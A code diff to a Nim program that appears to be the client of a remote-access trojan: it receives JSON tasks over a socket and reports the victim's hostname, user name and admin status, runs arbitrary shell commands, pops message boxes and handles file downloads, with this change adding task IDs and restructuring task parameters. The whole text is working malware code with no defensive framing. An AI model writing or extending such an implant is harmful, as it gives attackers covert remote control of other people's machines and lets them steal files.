@@ -19,20 +19,23 @@ proc receiveCommands(client: Socket) =
         let task = decode(line)
 
         let jsonNode = parseJson(task)
+        let taskId = jsonNode["taskId"].getInt()
+
         case jsonNode["task"].getStr():
         of "identify":
             client.identify(
+                taskId,
                 hostname=hostname(),
                 username=username(), 
                 isAdmin=areWeAdmin()
             )
         of "shell": 
-            let toExec = jsonNode["shellCmd"].getStr()
-            shell.executeTask(client, toExec)
+            let toExec = jsonNode["data"]["shellCmd"].getStr()
+            shell.executeTask(client, taskId, toExec)
         of "msgbox":
-            msgbox.executeTask(client, jsonNode["title"].getStr(), jsonNode["caption"].getStr())
+            msgbox.executeTask(client, taskId, jsonNode["data"]["title"].getStr(), jsonNode["data"]["caption"].getStr())
         of "download":
-            download.executeTask(client, jsonNode["path"].getStr())
+            download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())
 
 receiveCommands(client)
   
